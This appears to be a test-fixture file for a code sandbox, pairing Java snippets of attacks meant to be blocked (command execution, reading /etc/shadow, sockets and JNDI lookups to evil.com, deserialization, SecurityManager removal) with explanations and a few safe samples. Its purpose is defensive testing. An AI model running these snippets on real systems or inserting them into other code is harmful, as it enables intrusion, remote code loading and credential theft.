/**
 * Java Security Attack Vectors
 * 
 * Java has strong security features but can still be exploited through
 * Runtime execution, reflection, class loading, and serialization.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const javaTests = [
  // ════════════════════════════════════════════════════════════════
  // RUNTIME EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Runtime.exec',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    Runtime.getRuntime().exec("whoami");
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: Runtime Command Execution
      
      How hackers use this:
      Runtime.exec() is Java's primary method for executing system commands.
      It creates a native process to run the specified command.
      
      Real-world impact:
      - Execute any shell command
      - Download and run malware
      - Reverse shells
      - Data exfiltration
      
      Historical note:
      This is the most common Java RCE vector, found in countless CVEs
      including Struts2, Log4Shell exploitation chains, and many more.
    `,
  },
  {
    name: 'Java: ProcessBuilder',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("ls", "-la");
    pb.start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: ProcessBuilder Command Execution
      
      How hackers use this:
      ProcessBuilder provides more control over process creation than Runtime.exec().
      It allows setting environment, directory, and I/O redirection.
      
      Real-world impact:
      - More powerful than Runtime.exec()
      - Control environment variables
      - Redirect stdin/stdout for interactive shells
      - Chain commands together
    `,
  },
  {
    name: 'Java: ProcessBuilder with commands',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    new ProcessBuilder().command("cat", "/etc/passwd").start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 ATTACK: ProcessBuilder Command Method
      
      How hackers use this:
      The command() method sets the command to execute.
      Commonly used with .start() for process creation.
      
      Real-world impact:
      - Same as constructor-based ProcessBuilder
      - More readable for complex commands
      - Common in real-world exploits
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: FileInputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileInputStream fis = new FileInputStream("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Reading via FileInputStream
      
      How hackers use this:
      FileInputStream provides direct file access.
      Used to read sensitive files like configurations and credentials.
      
      Real-world impact:
      - Read /etc/passwd, /etc/shadow
      - Access application config files
      - Steal private keys and certificates
      - Read environment files
    `,
  },
  {
    name: 'Java: FileOutputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileOutputStream fos = new FileOutputStream("/tmp/evil.sh");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: File Writing via FileOutputStream
      
      How hackers use this:
      FileOutputStream creates or overwrites files.
      Used to plant backdoors or modify configurations.
      
      Real-world impact:
      - Write malicious scripts
      - Create web shells
      - Modify application code
      - Plant SSH keys for persistence
    `,
  },
  {
    name: 'Java: FileReader',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileReader fr = new FileReader("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Character-Based File Reading
      
      How hackers use this:
      FileReader is a convenience class for text files.
      Same file access capabilities as FileInputStream.
      
      Real-world impact:
      - Read text-based config files
      - Alternative to FileInputStream
      - More suitable for character data
    `,
  },
  {
    name: 'Java: FileWriter',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileWriter fw = new FileWriter("/tmp/malware.txt");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Character-Based File Writing
      
      How hackers use this:
      FileWriter provides text file writing.
      Same file creation capabilities as FileOutputStream.
      
      Real-world impact:
      - Write configuration files
      - Create script files
      - Alternative to FileOutputStream for text
    `,
  },
  {
    name: 'Java: RandomAccessFile',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    RandomAccessFile raf = new RandomAccessFile("/etc/passwd", "r");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: Random Access File Operations
      
      How hackers use this:
      RandomAccessFile allows reading/writing at any position.
      Useful for modifying specific parts of files.
      
      Real-world impact:
      - Read specific sections of files
      - Patch binaries or configs
      - Append to log files
    `,
  },
  {
    name: 'Java: Files.readAllBytes',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    byte[] data = Files.readAllBytes(Paths.get("/etc/passwd"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: NIO Files Reading
      
      How hackers use this:
      java.nio.file.Files provides modern file operations.
      readAllBytes() is a convenient one-liner for file theft.
      
      Real-world impact:
      - Modern alternative to FileInputStream
      - Complete file content in one call
      - Easy to exfiltrate
    `,
  },
  {
    name: 'Java: Files.write',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Files.write(Paths.get("/tmp/evil.txt"), "malicious".getBytes());
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: NIO Files Writing
      
      How hackers use this:
      Files.write() creates or overwrites files with provided content.
      Modern and concise API for file creation.
      
      Real-world impact:
      - Quick file creation
      - Easy backdoor deployment
      - Modern NIO API
    `,
  },
  {
    name: 'Java: Files.newInputStream',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    var is = Files.newInputStream(Paths.get("/etc/shadow"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 ATTACK: NIO InputStream Creation
      
      How hackers use this:
      Files.newInputStream() creates an InputStream for NIO paths.
      Bridges NIO paths with traditional I/O streams.
      
      Real-world impact:
      - Access restricted files
      - NIO path handling
      - Stream-based processing
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Socket connection',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Socket s = new Socket("evil.com", 4444);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Raw Socket Connection (Reverse Shell)
      
      How hackers use this:
      Java Sockets enable network connections.
      Primary method for reverse shells in Java.
      
      Real-world impact:
      - Reverse shell connections
      - Data exfiltration
      - C2 communication
      - Port scanning
      
      Classic pattern:
      Socket → redirect I/O → Runtime.exec("/bin/sh")
    `,
  },
  {
    name: 'Java: ServerSocket',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ServerSocket ss = new ServerSocket(9999);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Bind Shell / Listener
      
      How hackers use this:
      ServerSocket creates a listening port.
      Used for bind shells where attacker connects to victim.
      
      Real-world impact:
      - Bind shell backdoors
      - Internal service creation
      - Proxy/tunnel endpoints
    `,
  },
  {
    name: 'Java: URL connection',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    URL url = new URL("https://evil.com/payload");
    url.openConnection();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: URL-Based Network Access
      
      How hackers use this:
      URL class provides high-level URL operations.
      Can fetch remote content or exfiltrate data.
      
      Real-world impact:
      - Download malware payloads
      - Exfiltrate data via HTTP
      - SSRF attacks
    `,
  },
  {
    name: 'Java: HttpClient',
    code: `import java.net.http.*;
import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    HttpClient client = HttpClient.newHttpClient();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Modern HTTP Client
      
      How hackers use this:
      java.net.http.HttpClient is the modern HTTP API (Java 11+).
      Clean API for HTTP requests.
      
      Real-world impact:
      - Modern data exfiltration
      - Clean HTTP communication
      - Async request capabilities
    `,
  },
  {
    name: 'Java: URLClassLoader remote',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    URLClassLoader cl = new URLClassLoader(new URL[]{new URL("http://evil.com/")});
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 ATTACK: Remote Class Loading
      
      How hackers use this:
      URLClassLoader can load classes from remote URLs.
      Downloads and executes attacker-provided code.
      
      Real-world impact:
      - Download and execute remote Java classes
      - Classic RCE technique
      - Bypasses code review (code is remote)
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Reflection invoke',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Method m = Runtime.class.getMethod("exec", String.class);
    m.invoke(Runtime.getRuntime(), "id");
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Reflection-Based Command Execution
      
      How hackers use this:
      Reflection allows calling methods dynamically by name.
      Bypasses compile-time security checks.
      
      Real-world impact:
      - Call private/protected methods
      - Bypass security managers
      - Dynamic payload construction
      - Core of many Java exploits
    `,
  },
  {
    name: 'Java: Class.forName loading',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    Class.forName("java.lang.Runtime").getMethod("exec", String.class);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Dynamic Class Loading
      
      How hackers use this:
      Class.forName() loads classes by name at runtime.
      First step in reflection-based attacks.
      
      Real-world impact:
      - Load any class dynamically
      - String-based class references bypass static analysis
      - Foundation for reflection exploits
    `,
  },
  {
    name: 'Java: setAccessible bypass',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Field f = System.class.getDeclaredField("security");
    f.setAccessible(true);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: Access Control Bypass
      
      How hackers use this:
      setAccessible(true) bypasses Java's access controls.
      Enables access to private fields and methods.
      
      Real-world impact:
      - Access private fields
      - Modify final fields
      - Disable SecurityManager
      - Escalate privileges
    `,
  },
  {
    name: 'Java: MethodHandles.lookup',
    code: `import java.lang.invoke.*;
public class Main {
  public static void main(String[] args) throws Exception {
    MethodHandles.Lookup lookup = MethodHandles.lookup();
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: MethodHandle Reflection
      
      How hackers use this:
      MethodHandles is a modern reflection API.
      Often bypasses security checks better than traditional reflection.
      
      Real-world impact:
      - Alternative reflection mechanism
      - May bypass SecurityManager
      - Invoke private methods
      - Used in advanced exploits
    `,
  },
  {
    name: 'Java: VarHandle',
    code: `import java.lang.invoke.*;
public class Main {
  public static void main(String[] args) throws Exception {
    VarHandle vh;
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 ATTACK: VarHandle Field Access
      
      How hackers use this:
      VarHandle provides direct field access with minimal overhead.
      Modern alternative to Field reflection.
      
      Real-world impact:
      - Low-level field manipulation
      - Atomic operations on any field
      - Bypass encapsulation
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SERIALIZATION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: ObjectInputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(System.in);
    Object obj = ois.readObject();
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: Unsafe Deserialization
      
      How hackers use this:
      ObjectInputStream.readObject() deserializes Java objects.
      Malicious objects can execute code during deserialization.
      
      Real-world impact:
      - Remote Code Execution via gadget chains
      - Classic Java deserialization vulnerability
      - Thousands of CVEs (Apache Commons, WebLogic, etc.)
      
      Famous exploits:
      - Apache Commons Collections gadget chain
      - WebLogic T3 deserialization
      - JBoss, Jenkins, and many more
    `,
  },
  {
    name: 'Java: XMLDecoder',
    code: `import java.beans.*;
import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    XMLDecoder decoder = new XMLDecoder(new FileInputStream("malicious.xml"));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: XML Deserialization
      
      How hackers use this:
      XMLDecoder deserializes Java objects from XML.
      Malicious XML can create arbitrary objects.
      
      Real-world impact:
      - RCE via XML payloads
      - Often overlooked in security audits
      - CVE-2017-3506 (WebLogic)
    `,
  },
  {
    name: 'Java: XStream',
    code: `import com.thoughtworks.xstream.*;
public class Main {
  public static void main(String[] args) {
    XStream xstream = new XStream();
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: XStream XML Serialization
      
      How hackers use this:
      XStream is a popular XML serialization library.
      Has had numerous RCE vulnerabilities.
      
      Real-world impact:
      - Multiple CVEs (CVE-2020-26217, CVE-2021-21344, etc.)
      - Common in enterprise Java apps
      - XML-based RCE
    `,
  },
  {
    name: 'Java: YAML deserialization',
    code: `import org.yaml.snakeyaml.*;
public class Main {
  public static void main(String[] args) {
    Yaml yaml = new Yaml();
    yaml.load("!!java.lang.Runtime [\"whoami\"]");
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 ATTACK: YAML Deserialization
      
      How hackers use this:
      SnakeYAML can instantiate arbitrary classes from YAML.
      !! prefix specifies class types.
      
      Real-world impact:
      - RCE via YAML payloads
      - CVE-2022-1471 (SnakeYAML)
      - Common in Spring applications
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // JNDI ATTACKS (Log4Shell style)
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: JNDI lookup',
    code: `import javax.naming.*;
public class Main {
  public static void main(String[] args) throws Exception {
    InitialContext ctx = new InitialContext();
    ctx.lookup("ldap://evil.com/exploit");
  }
}`,
    expectBlocked: true,
    category: 'jndi_injection',
    explanation: `
      🎯 ATTACK: JNDI Injection (Log4Shell Pattern)
      
      How hackers use this:
      JNDI lookup can load remote objects from LDAP/RMI servers.
      This is the core of the Log4Shell (CVE-2021-44228) attack.
      
      Real-world impact:
      - Log4Shell - one of the worst vulnerabilities ever
      - Download and execute remote Java classes
      - Affects millions of servers
      
      Attack flow:
      1. Attacker injects \${jndi:ldap://evil.com/x}
      2. Victim server looks up LDAP
      3. LDAP returns malicious class reference
      4. Class is loaded and executed
    `,
  },
  {
    name: 'Java: InitialContext',
    code: `import javax.naming.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Context ctx = new InitialContext();
  }
}`,
    expectBlocked: true,
    category: 'jndi_injection',
    explanation: `
      🎯 ATTACK: JNDI Context Creation
      
      How hackers use this:
      InitialContext is the gateway to JNDI operations.
      Required for JNDI-based attacks.
      
      Real-world impact:
      - Prerequisite for JNDI injection
      - Can be configured for remote lookups
      - Core JNDI functionality
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SCRIPT ENGINE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: ScriptEngine eval',
    code: `import javax.script.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    engine.eval("java.lang.Runtime.getRuntime().exec('id')");
  }
}`,
    expectBlocked: true,
    category: 'script_engine',
    explanation: `
      🎯 ATTACK: JavaScript Engine Command Execution
      
      How hackers use this:
      Java's ScriptEngine can execute JavaScript.
      JavaScript can access Java classes and execute commands.
      
      Real-world impact:
      - Execute commands via embedded JavaScript
      - Bypass Java-only security checks
      - Often overlooked attack vector
    `,
  },
  {
    name: 'Java: ScriptEngineManager',
    code: `import javax.script.*;
public class Main {
  public static void main(String[] args) {
    ScriptEngineManager manager = new ScriptEngineManager();
  }
}`,
    expectBlocked: true,
    category: 'script_engine',
    explanation: `
      🎯 ATTACK: Script Engine Access
      
      How hackers use this:
      ScriptEngineManager provides access to scripting engines.
      Gateway to JavaScript/Groovy/other script execution.
      
      Real-world impact:
      - Access to multiple script engines
      - Cross-language code execution
      - Scripting bypass for security
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // UNSAFE MEMORY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: sun.misc.Unsafe',
    code: `import sun.misc.Unsafe;
public class Main {
  public static void main(String[] args) throws Exception {
    java.lang.reflect.Field f = Unsafe.class.getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Unsafe unsafe = (Unsafe) f.get(null);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 ATTACK: Unsafe Memory Operations
      
      How hackers use this:
      sun.misc.Unsafe provides raw memory access.
      Bypasses all Java safety mechanisms.
      
      Real-world impact:
      - Arbitrary memory read/write
      - Create objects without constructors
      - Bypass security completely
      - Memory corruption attacks
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CLASSLOADER ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: defineClass',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 ATTACK: Dynamic Class Definition
      
      How hackers use this:
      defineClass() creates new classes from bytecode.
      Can inject malicious classes at runtime.
      
      Real-world impact:
      - Load attacker's bytecode directly
      - Bypass class verification
      - Create classes without .class files
    `,
  },
  {
    name: 'Java: Custom ClassLoader',
    code: `public class Evil extends ClassLoader {
  public Class<?> loadMalicious(byte[] bytes) {
    return defineClass(null, bytes, 0, bytes.length);
  }
}
public class Main {
  public static void main(String[] args) {}
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 ATTACK: Custom ClassLoader Creation
      
      How hackers use this:
      Extending ClassLoader allows custom class loading logic.
      Can bypass security restrictions.
      
      Real-world impact:
      - Load malicious bytecode
      - Bypass class signing
      - Custom security bypass
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM PROPERTY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: System.getProperty',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(System.getProperty("user.home"));
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: System Property Information Disclosure
      
      How hackers use this:
      System properties reveal system configuration.
      Useful for reconnaissance.
      
      Real-world impact:
      - User home directory
      - Java version and paths
      - OS information
      - File encoding and paths
    `,
  },
  {
    name: 'Java: System.setProperty',
    code: `public class Main {
  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: System Property Manipulation
      
      How hackers use this:
      Setting system properties can enable vulnerabilities.
      The example enables JNDI remote code loading.
      
      Real-world impact:
      - Enable vulnerable configurations
      - Bypass security restrictions
      - Enable JNDI attacks
    `,
  },
  {
    name: 'Java: System.getenv',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(System.getenv());
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Environment Variable Theft
      
      How hackers use this:
      System.getenv() returns all environment variables.
      Contains sensitive credentials and configuration.
      
      Real-world impact:
      - AWS credentials
      - Database passwords
      - API keys
      - Application secrets
    `,
  },
  {
    name: 'Java: System.exit',
    code: `public class Main {
  public static void main(String[] args) {
    System.exit(1);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Denial of Service
      
      How hackers use this:
      System.exit() terminates the JVM.
      Causes immediate service disruption.
      
      Real-world impact:
      - Crash the application
      - Denial of service
      - Affect all users
    `,
  },
  {
    name: 'Java: Runtime.halt',
    code: `public class Main {
  public static void main(String[] args) {
    Runtime.getRuntime().halt(1);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 ATTACK: Immediate JVM Termination
      
      How hackers use this:
      halt() terminates immediately without shutdown hooks.
      More aggressive than System.exit().
      
      Real-world impact:
      - Immediate shutdown
      - Skip cleanup code
      - Potential data corruption
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SECURITY MANAGER BYPASS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: SecurityManager manipulation',
    code: `public class Main {
  public static void main(String[] args) {
    System.setSecurityManager(null);
  }
}`,
    expectBlocked: true,
    category: 'security_bypass',
    explanation: `
      🎯 ATTACK: SecurityManager Removal
      
      How hackers use this:
      Setting SecurityManager to null removes all security checks.
      Enables all previously restricted operations.
      
      Real-world impact:
      - Remove all security restrictions
      - Full system access
      - Complete sandbox escape
      
      Note: SecurityManager is deprecated in Java 17+
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NATIVE CODE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: System.loadLibrary',
    code: `public class Main {
  public static void main(String[] args) {
    System.loadLibrary("evil");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: Native Library Loading
      
      How hackers use this:
      loadLibrary() loads native shared libraries (.so/.dll).
      Native code has no Java security restrictions.
      
      Real-world impact:
      - Execute native malware
      - Bypass all Java security
      - Direct system access
    `,
  },
  {
    name: 'Java: System.load',
    code: `public class Main {
  public static void main(String[] args) {
    System.load("/tmp/evil.so");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: Native Library Loading by Path
      
      How hackers use this:
      load() loads a library by full path.
      Can load malicious libraries from attacker-controlled locations.
      
      Real-world impact:
      - Load library from any path
      - No library path restrictions
      - Direct path to malicious .so file
    `,
  },
  {
    name: 'Java: Runtime.loadLibrary',
    code: `public class Main {
  public static void main(String[] args) {
    Runtime.getRuntime().loadLibrary("malicious");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 ATTACK: Runtime Native Library Loading
      
      How hackers use this:
      Alternative API for loading native libraries.
      Same capabilities as System.loadLibrary().
      
      Real-world impact:
      - Same as System.loadLibrary
      - Alternative API path
      - May bypass some filters
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Safe print',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println("Hello, World!");
  }
}`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Basic Console Output
      
      This is legitimate code that should execute:
      System.out.println() is fundamental for
      learning Java and debugging.
    `,
  },
  {
    name: 'Java: Safe math',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(2 + 2);
  }
}`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Mathematical Operations
      
      This is legitimate code that should execute:
      Basic arithmetic is essential for
      any programming task.
    `,
  },
  {
    name: 'Java: Safe class',
    code: `class Point {
  int x, y;
  Point(int x, int y) { this.x = x; this.y = y; }
  int sum() { return x + y; }
}
public class Main {
  public static void main(String[] args) {
    Point p = new Point(3, 4);
    System.out.println(p.sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Object-Oriented Programming
      
      This is legitimate code that should execute:
      Class definitions, constructors, and methods
      are core Java functionality.
    `,
  },
  {
    name: 'Java: Safe streams',
    code: `import java.util.Arrays;
public class Main {
  public static void main(String[] args) {
    int sum = Arrays.stream(new int[]{1, 2, 3, 4, 5}).sum();
    System.out.println(sum);
  }
}`,
    expectBlocked: false,
    expectedOutput: '15',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Stream API
      
      This is legitimate code that should execute:
      Java Streams for collection processing
      are a modern, safe feature.
    `,
  },
  {
    name: 'Java: Safe lambda',
    code: `import java.util.function.*;
public class Main {
  public static void main(String[] args) {
    Function<Integer, Integer> square = x -> x * x;
    System.out.println(square.apply(5));
  }
}`,
    expectBlocked: false,
    expectedOutput: '25',
    category: 'safe_code',
    explanation: `
      ✅ SAFE: Lambda Expressions
      
      This is legitimate code that should execute:
      Functional interfaces and lambdas are
      safe modern Java features.
    `,
  },
];
